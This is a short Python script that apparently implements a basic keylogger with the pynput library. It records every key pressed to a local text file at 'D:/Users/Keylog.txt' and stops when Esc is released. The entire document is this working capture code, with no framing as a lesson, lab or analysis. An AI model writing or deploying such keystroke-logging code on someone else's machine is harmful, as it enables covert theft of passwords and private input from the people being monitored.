from pynput.keyboard import Key, Listener
     
def press(key):
    f = open('D:/Users/Keylog.txt', 'a+')
    buffer = f.read()
    buffer += format(key).strip('\'')
    f.write(buffer)
    f.close()
    
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False
        

with Listener(
        on_press=press,
        on_release=on_release) as listener: 
    listener.join()

